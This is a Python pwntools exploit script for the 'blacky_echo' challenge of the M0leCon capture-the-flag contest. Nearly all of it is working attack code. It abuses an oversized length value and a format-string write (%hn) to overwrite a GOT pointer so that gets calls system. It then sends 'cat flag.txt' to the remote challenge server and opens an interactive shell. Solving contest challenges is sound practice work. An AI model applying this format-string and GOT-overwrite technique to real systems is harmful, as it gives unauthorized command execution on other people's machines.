from libformatstr import FormatStr
from pwn import *

context.log_level = "debug"
exe = ELF("/home/alessio/Scrivania/tools/CTFs/M0leCon/blacky_echo/blacky_echo")
context.binary = exe
HOST = "challs.m0lecon.it"
PORT = 9011
p = remote(HOST, PORT)

p.sendlineafter(": ", str(268435457))
addr = 0x602088
go = 0x400B54
system = 0x400840
p.sendlineafter(": ", "A" * 0x1000a + "%2875c....%12$hn...\x88\x20\x60\x00\x00\x00\x00\x00")
p.sendlineafter("Size: ", str(268435457))
# Overwrite the poiter to the function gets with the address of function system
p.sendlineafter(": ", "A" * 0x1000a + "%2087c....%12$hn...\x20\x20\x60\x00\x00\x00\x00\x00")
p.sendlineafter("Size: ", str(268435457))
# send the command to the function system("")
p.sendline("ECHO->" + "cat flag.txt")
# Spawn an interactive shell with the server
p.interactive()
